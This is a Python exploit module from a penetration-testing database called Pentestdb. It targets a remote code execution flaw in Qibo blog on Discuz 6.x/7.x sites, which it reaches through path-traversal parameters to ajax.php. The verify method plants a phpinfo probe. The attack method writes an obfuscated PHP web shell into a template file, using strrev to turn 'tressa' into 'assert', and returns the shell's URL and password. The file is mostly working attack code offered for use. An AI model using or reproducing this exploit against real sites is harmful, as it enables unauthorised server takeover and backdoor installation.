#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2014-2015 alpha1e0
'''

from script.exploit import Exploit, Result


class QiboblogRCE(Exploit):
    expName = u"齐博blog 远程代码执行"
    version = "1.0"
    author = "alpha1e0"
    language = "php"
    appName = "discuz"
    appVersion = "6.x 7.x"
    reference = ['http://www.wooyun.org/bugs/wooyun-2015-098582']
    description = u'''
        利用条件：需登录（提供cookie参数）
    '''

    def verify(self):
        result = Result()

        sig = '_SERVER["HTTP_HOST"]'
        payload = "<?php phpinfo();?>"
        url = self.baseURL if "ajax.php" in self.baseURL else self.host+"/blog/ajax.php"
        params = "?inc=ol_module&step=2&step=2&moduleid=../../../../hack/template/admin&action=maketpl&Apower[template_list]=1&postdb[filepath]=template/blue.htm&postdb[code]={0}".format(payload)

        try:
            response = self.http.get(url+params, headers=self.headers)
        except self.http.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result

        params2 = "?inc=edit_sort&job=../../../../template/blue"
        try:
            response2 = self.http.get(url+params2, headers=self.headers)
        except self.http.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result

        if response2.status_code == 200:
            if sig in response2.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = payload

        return result


    def attack(self):
        result = Result()

        sig = "strrev"
        payload = '<?php $f=strrev($_GET["f"]);$f($_POST["pass"]);?>'
        url = self.baseURL if "ajax.php" in self.baseURL else self.host+"/blog/ajax.php"
        params = "?inc=ol_module&step=2&step=2&moduleid=../../../../hack/template/admin&action=maketpl&Apower[template_list]=1&postdb[filepath]=template/green.htm&postdb[code]={0}".format(payload)

        try:
            response = self.http.get(url+params, headers=self.headers)
        except self.http.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result

        url2 = url.replace("/blog/ajax.php","/template/green.htm")
        try:
            response2 = self.http.get(url2, headers=self.headers)
        except self.http.RequestException as error:
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error, {0}".format(str(error))
            return result

        if response2.status_code == 200:
            if sig in response2.content:
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = url + "?inc=edit_sort&job=../../../../template/green&f=tressa"
                result['ShellInfo']['Payload'] = "password: pass"

        return result
